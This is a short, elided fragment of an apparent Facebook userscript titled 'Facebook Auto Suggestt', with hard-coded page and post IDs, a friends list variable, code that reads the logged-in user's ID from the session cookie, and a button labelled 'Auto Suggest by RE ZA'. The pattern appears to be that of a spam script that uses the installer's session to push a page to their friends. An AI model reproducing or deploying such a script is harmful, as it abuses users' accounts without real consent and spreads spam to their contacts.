...
// @description     Facebook Auto Suggestt
...
var spage_id = "174748366012083";
var spost_id = "174748366012083";
var sfoto_id = "174748366012083";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by RE ZA';
